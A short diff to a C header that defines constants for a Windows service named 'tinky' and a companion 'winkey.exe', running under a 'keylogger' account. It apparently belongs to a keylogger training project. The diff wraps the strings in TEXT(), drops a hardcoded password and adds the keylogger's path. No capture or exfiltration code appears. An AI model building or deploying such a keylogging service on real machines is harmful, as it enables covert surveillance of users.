@@ -7,11 +7,11 @@
 #include "unicode.h"
 
 // =============== Magic variables ========== //
-#define USER_NAME ".\\keylogger"
-#define LOCALSYS "keylogger\\LocalSystem"
-#define USER_PASS "docker"
+#define USER_NAME TEXT(".\\keylogger")
+#define LOCALSYS TEXT("keylogger\\LocalSystem")
 #define SVC_NAME TEXT("tinky")
 #define DEF_NAME ""
+#define WINKEY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\winkey.exe")
 #define BINARY_PATH TEXT("C:\\Users\\keylogger\\Desktop\\trash\\tinky-winkey\\prog.exe")
 // global {
 #define FAILURE 0
